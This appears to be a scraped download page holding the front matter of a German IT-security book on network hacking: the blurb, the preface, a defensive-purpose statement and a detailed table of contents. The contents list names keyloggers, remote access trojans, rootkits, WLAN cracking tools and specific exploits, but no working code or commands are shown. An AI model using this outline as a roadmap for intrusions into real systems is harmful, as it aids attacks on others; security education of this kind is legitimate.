{"title": "Network.hacking Professionelle.angriffs .Und.verteidigungstechniken.gegen.hacker.und.Datendiebe.edition.2 - Free Download PDF", "author": null, "url": null, "hostname": null, "description": "Descri\u00e7\u00e3o: Ein Guide, um sich gegen Hackerangriffe zu verteidigen....", "sitename": "Network.hacking Professionelle.angriffs .Und.verteidigungstechniken.gegen.hacker.und.Datendiebe.edition.2", "date": "2018-04-21", "id": null, "license": null, "body": null, "comments": "", "commentsbody": null, "raw_text": null, "text": "60030-9 U1+U4:Layout 1\n31.03.2010\n16:13 Uhr\nSeite 1\nKnow-how ist blau.\nDr. Peter Kraft/Andreas Weyert Dr. Peter Kraft/Andreas Weyert\nAus dem Inhalt: \u2022 Die Werkzeuge f\u00fcr Angriff und Verteidigung\n2. aktualisierte Auflage\n\u2022 Keylogger \u2013 jeder Tastendruck wird registriert \u2022 Digitale Dietriche \u2013 Passwortknacker\n\u2022 Proxys und Socks \u2013 digitale Tarnkappen \u2022 PC-Fernsteuerungen: Remote-Access-Tools \u2022 Rootkits \u2013 die versteckte Bedrohung \u2022 Schn\u00fcffelnasen im Netz: Scanner und Sniffer\nWer seine Daten sch\u00fctzen will, muss die Einbruchswerkzeuge und die Methoden der potenziellen Diebe kennen. In dieser komplett \u00fcberarbeiteten Neuauflage des Beststellers \u201eNetwork Hacking\u201c beschreiben die Autoren Dr. Peter Kraft und Andreas Weyert die Tools und Vorgehensweisen der Datenpiraten und zeigen effektive Schutzma\u00dfnahmen. So erfahren Sie unter anderem, wie Hacker Malware mit Rootkits verbergen und wie Sie sich dagegen wehren, wie Sie Ihr Heimnetzwerk effektiv absichern und welche Sicherheitsrichtlinien in Unternehmen wirklich greifen.\n\uc530\n\uc530\n\uc530\nDie Tools der Cracker und Datenpiraten Nur wer wei\u00df, wie Hacking-Tools funktionieren, kann sich auch dagegen sch\u00fctzen. Minuti\u00f6s stellen die Autoren die gesamte Bandbreite der Werkzeuge vor und demonstrieren, wie Keylogger die Eingaben ahnungsloser Benutzer mitschneiden, Passwort-Cracker Zugangskennungen knacken, Remote-Access-Tools PCs in Zombies verwandeln und Rootkits Malware verstecken. Motive und Strategien der Angreifer Kein Datenpirat ist wie der andere. Ihre Motivation und ihre Methoden zu verstehen, ist ein wichtiger Schritt zum effektiven Selbstschutz. Die Autoren schildern in sieben Szenarien, wie Datendiebe vorgehen und welche Schw\u00e4chen der Netzwerkinfrastruktur sie daf\u00fcr ausnutzen. Denn wer physischen Zugang zu einem Rechner hat, geht anders vor als jemand, der ein WLAN hacken oder eine Denial-of-Service-Attacke starten will. Ausgehend vom jeweiligen Bedrohungsszenario, stellen die Autoren konkrete Abwehrstrategien vor. So befestigen Sie Ihr Netzwerk Die Autoren geben fundierte Empfehlungen f\u00fcr eine proaktive Sicherheitsstrategie. Viele Schritte sind sogar kostenlos m\u00f6glich, so etwa die \u00dcberpr\u00fcfung des Sicherheitsstatus oder das Abschalten nicht ben\u00f6tigter Dienste auf Windows-PCs. Dar\u00fcber hinaus erhalten Sie leicht nachvollziehbare Ratschl\u00e4ge f\u00fcr die Auswahl von geeigneten Security-Tools und f\u00fcr das Erstellen wirksamer Sicherheitsrichtlinien in Unternehmen.\n\u2022 Angriffstools f\u00fcr drahtlose Netze \u2022 Die Angreifer und ihre Motive \u2022 Szenario I: Geklaute Daten \u2022 Szenario II: Verwanzte PCs \u2022 Szenario III: Angriffe durch Portscanner & Co. \u2022 Szenario IV: Defacements und D(D)oS-Angriffe \u2022 Szenario V: Gehacktes WLAN \u2022 Szenario VI: Malware-Attacke aus dem Internet \u2022 Szenario VII: Angriffe von innen \u2022 Wirkungsvolle Vorsorgestrategien bei privaten Netzwerken \u2022 Effektive Schutzma\u00dfnahmen f\u00fcr Firmennetze\n\u00dcber die Autoren: Dr. Peter Kraft ist Gesch\u00e4ftsf\u00fchrer von synTeam Dr. Kraft & Partner. Seit mehr als zehn Jahren ber\u00e4t er Kunden in Fragen der Organisationsentwicklung und -optimierung. Er ist Autor mehrerer erfolgreicher B\u00fccher zum Thema IT-Sicherheit und NLP. Andreas Weyert ist Security Consultant der buw consulting GmbH. Als Spezialist f\u00fcr die Themen Security Management, Informationssicherheit, PenetrationTesting und Datenschutz ist er vom BSI lizenzierter IT-Grundschutz-Auditor und zertifizierter Teamleiter f\u00fcr ISO-27001Audits.\nAuf www.buch.cd Feature-Listen und Bedienparameter der im Buch vorgestellten Hacking-Tools.\n49,95 EUR [D] ISBN 978-3-645-60030-9\nBesuchen Sie unsere Website\nwww.franzis.de\nNetwork Hacking\nProfessionelle Angriffs- und Verteidigungstechniken gegen Hacker und Datendiebe\n\u2022 Die Horchposten: Portscanner\nKraft Weyert\nNetwork Hacking\nProfessionelle Angriffs- und Verteidigungstechniken gegen Hacker und Datendiebe\n2. aktualisierte Auflage\nNetwork Hacking Professionelle Angriffs - und Verteidigungstechniken gegen Hacker und Datendiebe > Tools f\u00fcr Angriff und Verteidigung \u2013 vom Keylogger bis zum Rootkit > Vorbeugung gegen Malware-Attacken aus dem Internet > Effektive Schutzma\u00dfnahmen f\u00fcr Privat- und Firmennetze\n60030-9 Titelei:X\n31.03.2010\n16:06 Uhr\nSeite 1\nDr. Peter Kraft/Andreas Weyert\nNetwork Hacking\n60030-9 Titelei:X\n31.03.2010\n16:06 Uhr\nSeite 3\nDr. Peter Kraft / Andreas Weyert\nNetwork Hacking Professionelle Angriffs- und Verteidigungstechniken gegen Hacker und Datendiebe 2. aktualisierte Auflage\nMit 395 Abbildungen\n60030-9 Titelei:X\n31.03.2010\n16:06 Uhr\nSeite 4\nBibliografische Information der Deutschen Bibliothek Die Deutsche Bibliothek verzeichnet diese Publikation in der Deutschen Nationalbibliografie; detaillierte Daten sind im Internet \u00fcber http://dnb.ddb.de abrufbar.\nAlle Angaben in diesem Buch wurden vom Autor mit gr\u00f6\u00dfter Sorgfalt erarbeitet bzw. zusammengestellt und unter Einschaltung wirksamer Kontrollma\u00dfnahmen reproduziert. Trotzdem sind Fehler nicht ganz auszuschlie\u00dfen. Der Verlag und der Autor sehen sich deshalb gezwungen, darauf hinzuweisen, dass sie weder eine Garantie noch die juristische Verantwortung oder irgendeine Haftung f\u00fcr Folgen, die auf fehlerhafte Angaben zur\u00fcckgehen, \u00fcbernehmen k\u00f6nnen. F\u00fcr die Mitteilung etwaiger Fehler sind Verlag und Autor jederzeit dankbar. Internetadressen oder Versionsnummern stellen den bei Redaktionsschluss verf\u00fcgbaren Informationsstand dar. Verlag und Autor \u00fcbernehmen keinerlei Verantwortung oder Haftung f\u00fcr Ver\u00e4nderungen, die sich aus nicht von ihnen zu vertretenden Umst\u00e4nden ergeben. Evtl. beigef\u00fcgte oder zum Download angebotene Dateien und Informationen dienen ausschlie\u00dflich der nicht gewerblichen Nutzung. Eine gewerbliche Nutzung ist nur mit Zustimmung des Lizenzinhabers m\u00f6glich.\n\u00a9 2010 Franzis Verlag GmbH, 85586 Poing Alle Rechte vorbehalten, auch die der fotomechanischen Wiedergabe und der Speicherung in elektronischen Medien. Das Erstellen und Verbreiten von Kopien auf Papier, auf Datentr\u00e4gern oder im Internet, insbesondere als PDF, ist nur mit ausdr\u00fccklicher Genehmigung des Verlags gestattet und wird widrigenfalls strafrechtlich verfolgt. Die meisten Produktbezeichnungen von Hard- und Software sowie Firmennamen und Firmenlogos, die in diesem Werk genannt werden, sind in der Regel gleichzeitig auch eingetragene Warenzeichen und sollten als solche betrachtet werden. Der Verlag folgt bei den Produktbezeichnungen im Wesentlichen den Schreibweisen der Hersteller.\nSatz: DTP-Satz A. Kugge, M\u00fcnchen art & design: www.ideehoch2.de Druck: Bercker, 47623 Kevelaer Printed in Germany ISBN 978-3-645-60030-9\n5\nVorwort Als wir im Jahre 2007 die Erstausgabe unseres Buches auf den Markt brachten, konnten wir nicht ahnen, dass ihm ein \u2013 f\u00fcr ein Fachbuch \u2013 so beachtlicher Erfolg zuteilwerden w\u00fcrde. Ende 2009 dr\u00e4ngte uns der Programmleiter der Professional Series des Franzis Verlags, Herr Graser \u2013 dem wir an dieser Stelle Dank sagen m\u00f6chten f\u00fcr seine Unterst\u00fctzung und sein Verst\u00e4ndnis \u2013, uns doch bitte recht bald f\u00fcr eine \u00fcberarbeitete Neuauflage zu r\u00fcsten. Leider erwies sich diese \u00dcberarbeitung und Erg\u00e4nzung als aufwendiger, als wir dachten. Einmal mehr best\u00e4tigte sich das Urteil, dass die IT-Branche \u2013 und damit untrennbar verbunden der Bereich IT-Security \u2013 zu den innovativsten Bereichen unserer Gesellschaft z\u00e4hlt. Nur wenig konnte beim Alten bleiben; die meisten der hier dargestellten und eingesetzten Programme haben mindestens ein neues Finish erhalten \u2013 von neuen Funktionalit\u00e4ten mal ganz abgesehen. Andere Produkte der Dark Scene sind aus dem Untergrund verschwunden bzw. die alten Bezugsadressen haben sich ge\u00e4ndert. Auch dem mussten wir nachgehen. Nicht zu vergessen ist, dass sich die Windows-J\u00fcnger seit Juni 2009 mit einem neuen Betriebssystem \u2013 Windows 7 \u2013 anfreunden d\u00fcrfen, welches mit wesentlich h\u00f6herer Zustimmung als der Vorg\u00e4nger Vista vom Markt begr\u00fc\u00dft wurde. Auch wenn es zum aktuellen Zeitpunkt (M\u00e4rz 2010) erst selten in Unternehmen anzutreffen ist, sahen wir uns dennoch dazu gen\u00f6tigt, es hier ebenfalls zu ber\u00fccksichtigen. Und was hat sich in den letzten drei Jahren nicht alles ge\u00e4ndert? Neben zahlreichen Datenschutzskandalen haben beispielsweise unsere Volksvertreter kein sonderlich gutes H\u00e4ndchen im Rahmen der digitalen Gesetzgebung bewiesen \u2013 \u00fcbrigens zum wiederholten Male \u2013 beginnend von der Online-Durchsuchung, dem Zugangserschwerungsgesetz bis hin zur Vorratsdatenspeicherung. Zuerst einmal die gute Nachricht: Das uns\u00e4gliche Gesetz zur Vorratsdatenspeicherung wurde j\u00fcngst vom BVerfG gekippt \u2013 ein Schritt in die richtige Richtung, wie wir finden. Soweit wir beurteilen konnten, hat das neu in Kraft getretene Computerstrafrecht nicht zwangsl\u00e4ufig dazu gef\u00fchrt, dass der Einsatz von IT-Infrastruktur-Tools wie Sniffer, Port-Scanner oder Security-Scanner aus Open-Source-Quellen nennenswert kriminalisiert wurde \u2013 wenn auch zahlreiche Autoren die Konsequenzen zogen und ihre Entwicklungen vom Markt nahmen oder in das benachbarte Ausland fl\u00fcchteten (erw\u00e4hnenswert an dieser Stelle u. a. The Hacker's Choice, Phenoelit oder die Website von KisMAC). Stiller Dank gilt an dieser Stelle im \u00dcbrigen mutigen Chefredakteuren1 und Unternehmen2, die sich seitens des Staates nicht einsch\u00fcchtern lassen und zur Selbstanzeige greifen oder bewusst das Risiko einer Klage eingehen. Auf der anderen Seite ist das Bedrohungsniveau (Daten- und Identit\u00e4tsdiebstahl, systematisches Aussp\u00e4hen von Firmenmitarbeitern) sowie die Zunahme von Drive-by1\nwww.heise.de/newsticker/meldung/Hacker-Paragraf-iX-Chefredakteur-zeigt-sich-selbst-an-191403.html\n2\nwww.darkreading.com/security/government/showArticle.jhtml?articleID=208804747\n6\nVorwort\nDownloads kontinuierlich gestiegen: Millionen von fremd- und ferngesteuerten PCs bedrohen unabh\u00e4ngigen Berichten zufolge die Internet-Community. Mehr als 500 000 Rechner werden Tag f\u00fcr Tag neu infiziert3. Was uns wider Erwarten nicht erreichte, waren Vorw\u00fcrfe, wir munitionierten Leute mit Angriffs-Know-how. Dazu f\u00e4llt uns spontan eine nette Geschichte ein. Wer je einen wenig talentierten Schl\u00fcsseldienst bei der Arbeit beobachtet hat, hat sich vielleicht schon gefragt, ob er nicht selbst mit dem Stemmeisen \u00c4hnliches erreicht h\u00e4tte. Nun, wir durften einmal einem Treffen von Lockpickern4 (\u00bbSchlossknackern\u00ab) beiwohnen, die zum Hobby selbst komplizierteste Schl\u00f6sser \u00fcberwanden \u2013 nicht mit Brachialgewalt, sondern mit K\u00f6pfchen und mit minimal invasiven Mitteln. Was wir hier gelernt haben, war nicht die Aufsperrtechnik zum \u00d6ffnen fremder Schl\u00f6sser, sondern ein differenziertes Verst\u00e4ndnis f\u00fcr Schl\u00f6sser und wie lange sie welchen Angriffen standhalten. Das Erste, was Leute nach einer solchen Session tun, ist, neue Schl\u00f6sser anzuschaffen und einzubauen. Genau das ist der didaktische Zweck dieses Buches. Wir m\u00f6chten interessierten Laien wie auch IT-Praktikern vorstellen, wie \u00bbb\u00f6se Buben\u00ab in fremde Rechner und Netze eindringen \u2013 nicht, um sie selbst zu \u00bbb\u00f6sen Buben\u00ab zu machen, sondern um sie f\u00fcr zus\u00e4tzliche Sicherheitsma\u00dfnahmen zu sensibilisieren. Versierten Cyberkriminellen sagen wir mit diesem Buch nichts Neues, und die oft geschm\u00e4hten Script-Kiddies m\u00f6gen vielleicht an wenigen Stellen profitieren, finden im Internet aber erheblich brisantere Informationen als hier. Richtig profitieren werden aber alle, die motiviert sind, sich mehr und vor allem gezielter f\u00fcr die Sicherheit ihrer Rechner und Netze zu engagieren. Ein Hinweis am Rande: Im Weiteren verwenden wir der Einfachheit halber den Begriff \u00bbHacker\u00ab als Synonym f\u00fcr einen Computerkriminellen. Wir sind uns der Tatsache bewusst, dass der Begriff \u00bbHacker\u00ab grunds\u00e4tzlich wertneutral ist und dass es verschiedene Formen der Interpretation gibt (so beispielsweise bei Steven Levy5 und Bruce Schneier6). Keineswegs m\u00f6chten wir denjenigen zu nahe treten, die sich selbst als \u00bbHacker\u00ab bezeichnen und beispielsweise als Kernel-Hacker in der Linux-Community mitwirken. An der bew\u00e4hrten Struktur unseres Buches hielten wir fest. Das Tools-Kapitel hat uns bei der \u00dcberarbeitung mit die meiste M\u00fche gekostet: Wir mussten pr\u00fcfen, was sich ver\u00e4ndert hat, ob der neu hinzugekommene Funktionsumfang die redaktionelle \u00dcberarbeitung rechtfertigt, ob die Tools auch unter Windows 7 oder aktuellen Linux-Kerneln laufen etc. pp. Auch bei der Darstellung der Angriffsszenarien, speziell in den Bereichen WLAN und Firmennetze, sind neue Angriffstools bzw. -techniken zum Zuge gekommen. Wir hoffen, dass wir damit, wenigstens f\u00fcr die kommenden zwei Jahre, wieder auf der H\u00f6he der Zeit sind.\n3\nwww.computerwoche.de/security/1846557/\n4\nwww.lockpicking.org/SSDeV/start.php\n5\nwww.stevenlevy.com/index.php/other-books/hackers\n6\nwww.schneier.com/blog/archives/2006/09/what_is_a_hacke.html\nVorwort\n7\nTeil I \u2013 Hacking-Tools Wir haben f\u00fcr dieses Buch die gewohnte dreiteilige Gliederung beibehalten. Im ersten Teil stellen wir g\u00e4ngige Hacking-Werkzeuge vor, wobei wir bewusst darauf verzichtet haben, zwischen Malware-Tools und klassischer bzw. kommerzieller Security-Software zu unterscheiden. Die vorgestellten Tools erm\u00f6glichen meistens beides: sowohl Angriffsvorbereitung und -durchf\u00fchrung als auch Erkennen bzw. Abwehr von Schwachstellen und Sicherheitsl\u00fccken. Die Tools-Sektion hat dar\u00fcber hinaus durch die gew\u00e4hlte Systematik den Charakter eines Nachschlagewerks. Durch die Beschreibung des Anwendungszwecks, von Bezugshinweisen, Kosten und Installationshinweisen kann jeder absch\u00e4tzen, wie n\u00fctzlich und brauchbar das eine oder andere Werkzeug f\u00fcr seine Zwecke ist. Vollst\u00e4ndigkeit haben wir bewusst nicht angestrebt. Dennoch glauben wir, damit einen guten Querschnitt \u00fcber die g\u00e4ngigsten Tools der Hacker wie ihrer Gegenspieler bieten zu k\u00f6nnen.\nTeil II \u2013 Angriff und Abwehr Der zweite Teil unseres Buchs ist der ausf\u00fchrlichste. Hier beschreiben wir im Detail, wie typische Angriffsszenarien aussehen k\u00f6nnen. Angriffsobjekte sind Rechner mit einer Netzwerkanbindung, im einfachsten Fall ein kleineres Heimnetzwerk. Wir zeigen nat\u00fcrlich auch, wie Firmennetzwerke und Internetpr\u00e4senzen mit den eingangs vorgestellten Tools penetriert werden k\u00f6nnen. Die Szenarien sind so gew\u00e4hlt, dass sie auch von Nichtprofis praktisch nachvollzogen werden k\u00f6nnen. Allerdings sollte man als Leser ein Grundverst\u00e4ndnis f\u00fcr die Netzwerk-Basics mitbringen. Wem beispielsweise die Unterschiede zwischen HTTP, FTP, TCP/IP, UDP etc. nicht recht gel\u00e4ufig sind, der wird hier eine grundlegende Erl\u00e4uterung vermissen und sollte sich an anderer Stelle noch ein wenig einlesen. Auf der anderen Seite besch\u00e4ftigen wir uns auch nicht damit, wie man Exploits, Trojaner oder Rootkits entwickelt \u2013 wir zeigen, wie sie funktionieren und wie man sie in bestimmten Situationen anwendet. An dieser Stelle auch die obligatorische Warnung: Sie als Leser sind auf jeden Fall f\u00fcr die Folgen Ihres Tuns selbst verantwortlich. Wer ein Netzwerk scannt, das nicht sein eigenes ist, bewegt sich in einer rechtlichen Grauzone. Wer sich durch einen Passwortcrack ein Login auf einem fremden Rechner erschleicht, eine bestehende Schw\u00e4che ausnutzt, um dort eine Remote-Shell zu etablieren, oder anderen Usern einen getarnten Keylogger schickt, ist definitiv auf der anderen Seite und kollidiert mit dem Strafgesetzbuch. Alle Angriffsszenarien enden \u00fcbrigens mit einem Abschnitt, der sich der Abwehr genau dieser zuvor beschriebenen, spezifischen Angriffstechnik widmet. Dies soll noch einmal klar belegen, dass wir kein Hackertraining anbieten, sondern f\u00fcr Hackangriffe und ihre Abwehr sensibilisieren wollen.\nTeil III \u2013 Vorsorge Im dritten Teil geht es um das grunds\u00e4tzliche Thema Pr\u00e4vention & Prophylaxe. Proaktives Sicherheitsmanagement ist gleicherma\u00dfen ein Thema sowohl f\u00fcr den Betreiber privater Netze als auch den Verantwortlichen kleinerer und mittlerer Firmennetze.\n9\nInhaltsverzeichnis Teil I: Tools \u2013 Werkzeuge f\u00fcr Angriff und Verteidigung......................................... 17 1\nKeylogger \u2013 Spionage par excellence........................................................... 19 1.1 Logkeys ........................................................................................... 20 1.2 Elite Keylogger ................................................................................. 20 1.3 Ardamax Keylogger .......................................................................... 22 1.4 Stealth Recorder Pro ........................................................................ 23 1.5 Elite Keylogger V.1 ........................................................................... 24 1.6 Hardware-Keylogger ......................................................................... 24 1.7 Abwehr \u2013 generelle Tipps................................................................. 26\n2\nPasswort-Knacker: Wo ein Wille ist, ist auch ein Weg ................................... 29 2.1 CMOSPwd ........................................................................................ 29 2.2 Hydra ............................................................................................... 30 2.3 Medusa............................................................................................ 32 2.4 VNCrack ........................................................................................... 34 2.5 PWDUMP (in unterschiedlichen Versionen bis PWDUMP7) ...................................................................................... 35 2.6 John the Ripper ................................................................................ 36 2.7 OphCrack......................................................................................... 37 2.8 SAMInside ....................................................................................... 38 2.9 Cain & Abel ...................................................................................... 39 2.10 L0phtcrack....................................................................................... 40 2.11 Distributed Password Recovery ........................................................ 41 2.12 Offline NT Password & Registry Editor............................................... 41 2.13 PW-Inspector (Hydra-Suite) .............................................................. 42 2.14 Abwehr \u2013 generelle Tipps................................................................. 42\n3\nAn den Toren r\u00fctteln: Portscanner & Co........................................................ 45 3.1 Nmap............................................................................................... 46 3.2 Lanspy ............................................................................................. 48 3.3 AW Security Portscanner .................................................................. 49 3.4 Winfingerprint .................................................................................. 50 3.5 Xprobe2 ........................................................................................... 51 3.6 p0f ................................................................................................... 53 3.7 Abwehr \u2013 generelle Tipps................................................................. 54\n10\nInhaltsverzeichnis\n4\nProxy & Socks.............................................................................................. 55 4.1 FreeCap............................................................................................ 56 4.2 Proxy Finder ..................................................................................... 57 4.3 Abwehr \u2013 generelle Tipps................................................................. 58\n5\nRemote Access Tools (RAT) \u2013 Anleitung f\u00fcr Zombie-Macher ............................... 59 5.1 Atelier Web Remote Commander ...................................................... 59 5.2 Poison Ivy ........................................................................................ 60 5.3 Turkojan........................................................................................... 61 5.4 Optix Pro.......................................................................................... 62 5.5 Abwehr \u2013 generelle Tipps................................................................. 63\n6\nRootkits \u2013 Malware stealthen ...................................................................... 65 6.1 Oddysee_Rootkit.............................................................................. 66 6.2 Hacker_Defender ............................................................................. 67 6.3 Abwehr \u2013 generelle Tipps................................................................. 68\n7\nSecurity-/Vulnerability-Scanner................................................................... 69 7.1 X-NetStat Professional ..................................................................... 69 7.2 GFI LANguard N.S.S. ......................................................................... 70 7.3 Nessus............................................................................................. 71 7.4 Open Vulnerability Assessment System / OpenVAS ......................... 73 7.5 Nikto2.............................................................................................. 75 7.6 w3bfukk0r ....................................................................................... 77 7.7 Abwehr \u2013 generelle Tipps................................................................. 77\n8\nSniffer: Die Schn\u00fcffler im Netzwerk.............................................................. 79 8.1 dsniff (dsniff-Suite) .......................................................................... 80 8.2 mailsnarf (dsniff-Suite) .................................................................... 81 8.3 urlsnarf (dsniff-Suite) ....................................................................... 83 8.4 arpspoof (dsniff-Suite) ..................................................................... 84 8.5 PHoss .............................................................................................. 85 8.6 Driftnet ............................................................................................ 86 8.7 Ettercap / Ettercap NG...................................................................... 87 8.8 tcpdump .......................................................................................... 88 8.9 Wireshark ........................................................................................ 89 8.10 Abwehr \u2013 generelle Tipps................................................................. 90\n9\nSonstige Hackertools................................................................................... 93 9.1 Metasploit Framework (MSF) ............................................................ 93 9.2 USBDUMPER 2 ................................................................................. 94 9.3 USB Switchblade / 7zBlade ............................................................. 95 9.4 Net Tools.......................................................................................... 96 9.5 Troll Downloader.............................................................................. 97\nInhaltsverzeichnis\n9.6 9.7 9.8 9.9 9.10 9.11 9.12 9.13 9.14\n11\nCzybik Gen Creation Kit .................................................................... 98 WMF-Maker...................................................................................... 99 fEvicol............................................................................................ 100 0x333shadow ................................................................................ 101 Logcleaner-NG ............................................................................... 102 NakedBind..................................................................................... 104 Ncat (Nmap-Suite) ......................................................................... 105 GNU MAC Changer (macchanger) ................................................... 106 Abwehr \u2013 generelle Tipps............................................................... 107\n10 Wireless Hacking ....................................................................................... 109 10.1 Kismet-Newcore ............................................................................. 110 10.2 Aircrack-NG (Aircrack-NG-Suite) ..................................................... 111 10.3 Aireplay-NG (Aircrack-NG-Suite) ..................................................... 112 10.4 Airodump-NG (Aircrack-NG-Suite)................................................... 113 10.5 Airbase-NG (Aircrack-NG-Suite) ...................................................... 114 10.6 coWPAtty ....................................................................................... 115 10.7 Pyrit ............................................................................................... 116 10.8 MDK3............................................................................................. 117 10.9 Vistumbler ..................................................................................... 118 10.10 Abwehr \u2013 generelle Tipps............................................................... 120 Teil II: Angriffsszenarien und Abwehrmechanismen.......................................... 121 11 Die Angreifer und ihre Motive .................................................................... 123 11.1 Die Motive...................................................................................... 123 11.1.1 Rache............................................................................................. 123 11.1.2 Geltungssucht................................................................................ 123 11.1.3 Furcht ............................................................................................ 124 11.1.4 Materielle Interessen ..................................................................... 124 11.1.5 Neugierde ...................................................................................... 125 11.2 Die Angreifer .................................................................................. 125 11.2.1 Hacker ........................................................................................... 126 11.2.2 Script-Kiddies ................................................................................ 127 11.2.3 IT-Professionals ............................................................................. 128 11.2.4 Normalanwender und PC-Freaks..................................................... 128 12 Szenario I: Datenklau vor Ort ..................................................................... 131 12.1 Zugriff auf Windows-PCs ................................................................ 131 12.1.1 Erkunden von Sicherheitsmechanismen ........................................ 131 12.1.2 \u00dcberwinden der CMOS-H\u00fcrde......................................................... 132 12.1.3 Das Admin-Konto erobern .............................................................. 134 12.2 Zugriff auf Linux-Rechner ............................................................... 141 12.2.1 Starten von Linux im Single-User-Mode.......................................... 142\n12\nInhaltsverzeichnis\n12.2.2 Starten von einem Linux-Boot-Medium .......................................... 146 12.2.3 Einbinden der zu kompromittierenden Festplatte in ein Fremdsystem ................................................................................. 147 12.3 Abwehrma\u00dfnahmen gegen einen physischen Angriff von au\u00dfen ............................................................................................ 148 12.4 Zwei-Faktoren-Authentifizierung..................................................... 150 12.4.1 iKey 2032 von SafeNet ................................................................... 150 12.4.2 Chipdrive Smartcard Office ............................................................ 153 12.4.3 Security Suite................................................................................. 156 13 Szenario II: Der PC ist verwanzt.................................................................. 159 13.1 Software-Keylogger ........................................................................ 161 13.1.1 Ausforschen von Sicherheitseinstellungen..................................... 161 13.1.2 Festlegen des \u00dcberwachungsumfangs ........................................... 161 13.1.3 Installation des Keyloggers ............................................................ 162 13.1.4 Sichten, Bewerten und Ausnutzen der gewonnenen Daten............. 165 13.1.5 Die Audio-Wanze............................................................................ 165 13.2 Big Brother im B\u00fcro........................................................................ 167 13.3 Abwehrma\u00dfnahmen gegen Keylogger & Co. ................................... 169 14 Szenario III: Spurensucher im Netz ............................................................ 175 14.1 Google-Hacking.............................................................................. 176 14.1.1 Angriffe .......................................................................................... 176 14.1.2 Abwehrma\u00dfnahmen....................................................................... 185 14.2 Portscanning, Fingerprinting und Enumeration............................... 187 14.2.1 Portscanning.................................................................................. 187 14.2.2 Fingerprinting und Enumeration ..................................................... 202 14.2.3 Security Scanner ............................................................................ 206 14.3 Abwehrma\u00dfnahmen gegen Portscanner & Co................................. 212 15 Szenario IV: Web Attack ............................................................................. 219 15.1 Defacements.................................................................................. 219 15.2 XSS-Angriffe................................................................................... 219 15.3 Angriff der W\u00fcrmer ......................................................................... 219 15.4 DoS- und DDoS-Attacken................................................................ 220 15.5 Ultima Ratio \u2013 Social Engineering oder Brute Force?....................... 228 15.6 Sicherheitsl\u00fccken systematisch erforschen ................................... 231 15.6.1 AccessDiver ................................................................................... 231 15.6.2 Spuren verwischen mit ProxyHunter ............................................... 233 15.6.3 Passwortlisten konfigurieren.......................................................... 237 15.6.4 Wortlisten im Eigenbau .................................................................. 239 15.6.5 Websecurity-Scanner: Paros........................................................... 241 15.6.6 Websecurity-Scanner: WVS ............................................................ 243 15.6.7 Websecurity-Scanner: Wikto .......................................................... 246\nInhaltsverzeichnis\n13\n15.7 Abwehrm\u00f6glichkeiten gegen Webattacken..................................... 252 15.7.1 .htaccess sch\u00fctzt vor unbefugtem Zugriff ....................................... 253 16 Szenario V: WLAN-Attacke.......................................................................... 257 16.1 Aufsp\u00fcren von Funknetzen............................................................. 259 16.1.1 Hardwareausstattung f\u00fcr Wardriving .............................................. 259 16.1.2 Vistumbler f\u00fcr Windows ................................................................ 261 16.1.3 Kismet-Newcore f\u00fcr Linux............................................................... 266 16.2 Kartografierung von Funknetzen..................................................... 279 16.2.1 Kartografierung von Funknetzen mit Google Maps.......................... 280 16.2.2 Kartografierung von Funknetzen mit Google Earth und Vistumbler ..................................................................................... 282 16.2.3 Kartografierung von Funknetzen mit Google Earth und KismetNewcore......................................................................................... 285 16.3 Angriffe auf Funknetze ................................................................... 288 16.3.1 Zugriff auf ein offenes WLAN .......................................................... 289 16.3.2 Zugriff auf ein WLAN, dessen Hotspot keine SSID sendet ............... 290 16.3.3 Zugriff auf ein WLAN, das keinen DHCP-Dienst anbietet ................. 292 16.3.4 Zugriff auf ein mit MAC-Filter gesichertes WLAN ............................. 297 16.3.5 Zugriff auf ein WEP-verschl\u00fcsseltes WLAN...................................... 302 16.3.6 Zugriff auf ein WPA2-verschl\u00fcsseltes WLAN.................................... 316 16.3.7 WLAN mon amour \u2013 Freu(n)de durch Funkwellen............................ 326 16.4 Sicherheitsma\u00dfnahmen bei Wireless LAN ...................................... 335 17 Szenario VI: Malware-Attacke aus dem Internet ......................................... 339 17.1 Angriffe via E-Mail .......................................................................... 340 17.1.1 Absendeadresse f\u00e4lschen .............................................................. 340 17.1.2 Phishen nach Aufmerksamkeit....................................................... 343 17.1.3 Der Payload oder Malware aus dem Baukasten .............................. 346 17.1.4 Massenattacken und Spam-Schleudern ......................................... 351 17.1.5 Office-Attacken .............................................................................. 353 17.1.6 Kampf der Firewall ......................................................................... 356 17.2 Rootkits ......................................................................................... 361 17.2.1 Test-Rootkit Unreal......................................................................... 363 17.2.2 AFX-Rootkit .................................................................................... 365 17.3 Die Infektion .................................................................................. 367 17.3.1 Experiment 1: Rechnung.pdf.exe .................................................... 368 17.3.2 Experiment 2: bild-07_jpg.com ...................................................... 370 17.4 Drive-by-Downloads ....................................................................... 373 17.5 Schutz vor (un)bekannten Sch\u00e4dlingen aus dem Netz.................... 378 17.5.1 Mailprogramm und Webbrowser absichern .................................... 379 17.5.2 Pflicht: Malware- und Antivirenscanner .......................................... 381 17.5.3 Malware-Abwehr mit Sandboxie..................................................... 384 17.5.4 Allzweckwaffe Behavior Blocker & HIPS ......................................... 386\n14\nInhaltsverzeichnis\n18 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt ...................... 391 18.1 Der Feind im eigenen Netzwerk ...................................................... 391 18.2 Zugriff auf das LAN......................................................................... 392 18.3 Passives Mitlesen im LAN: Sniffing................................................. 394 18.3.1 Tcpdump........................................................................................ 396 18.3.2 Wireshark ...................................................................................... 400 18.3.3 Ettercap NG.................................................................................... 402 18.3.4 DSniff-Suite ................................................................................... 413 18.3.5 Driftnet .......................................................................................... 424 18.3.6 P0f ................................................................................................. 424 18.3.7 ARPSpoof....................................................................................... 427 18.4 Scanning: \u00bbFull Contact\u00ab mit dem LAN ........................................... 430 18.4.1 Xprobe2 ......................................................................................... 431 18.4.2 Nmap............................................................................................. 435 18.4.3 Open Vulnerability Assessment System / OpenVAS ....................... 443 18.5 Der Tritt vors Schienbein: Exploits.................................................. 450 18.5.1 wunderbar_emporium.................................................................... 451 18.5.2 2009-lsa.zip / Samba < 3.0.20 heap overflow................................. 457 18.5.3 Metasploit Framework.................................................................... 461 18.6 Hurra, ich bin root \u2013 und nun?........................................................ 489 18.7 Windows-Rechner kontrollieren ..................................................... 489 18.7.1 Integration von Schadsoftware....................................................... 496 18.8 Linux unter Kontrolle: Rootkits installieren ..................................... 498 18.8.1 evilbs............................................................................................. 500 18.8.2 Mood-NT ........................................................................................ 504 18.8.3 eNYeLKM........................................................................................ 509 18.9 Linux unter Kontrolle: Spuren verwischen mit LogfileCleaner .......................................................................................... 514 18.10 Linux unter Kontrolle: Keylogger..................................................... 